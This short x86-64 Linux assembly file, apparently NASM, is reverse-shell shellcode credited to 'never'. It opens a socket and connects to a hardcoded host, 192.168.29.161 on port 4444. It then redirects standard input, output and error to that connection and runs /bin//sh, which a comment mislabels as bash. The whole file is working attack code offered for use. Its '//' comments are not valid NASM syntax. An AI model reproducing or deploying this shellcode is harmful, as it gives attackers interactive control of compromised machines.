//got inspiration from various exploit writer for linux and thanks all of the books and material i used to write this
//writer: never
section .data


section .text
global _start
_start:

xor rax, rax
add rax, 41    
mov rdi, 2
xor rsi, rsi
inc rsi
xor rdx, rdx
syscall			// socket
mov rdi, rax


xor rax, rax	
push rax
mov rax, 0xa11DA8C05C110002  //address and port  that i used to test 192.168.29.161:4444
push rax
mov rsi, rsp
xor rax, rax	
mov rax, 42		//sys number
mov rdx, 16
syscall			//connect



mov rsi, rax	

xor rax, rax	
mov rax, 33	
xor rsi, rsi
syscall			//dup2

xor rax, rax	
mov rax, 33
inc rsi
syscall			//dup2	

xor rax, rax	
mov rax, 33
inc rsi
syscall			//dup2


xor rax, rax	
push rax
mov rdx, rsp

mov rbx, 0x68732F6E69622F2F
push rbx
mov rdi, rsp
push rax
push rdi
mov rsi, rsp
add rax, 59	//execve bash 
syscall







